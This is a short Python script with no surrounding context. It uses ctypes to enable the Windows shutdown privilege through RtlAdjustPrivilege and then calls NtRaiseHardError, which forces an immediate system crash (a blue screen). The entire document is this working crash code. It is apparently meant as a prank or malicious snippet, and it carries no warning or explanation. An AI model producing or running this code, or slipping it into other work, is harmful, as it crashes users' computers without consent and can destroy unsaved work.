from random import randint;import ctypes;import time
ntdll = ctypes.windll.ntdll
prev_value = ctypes.c_bool()
res = ctypes.c_ulong()
ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res))
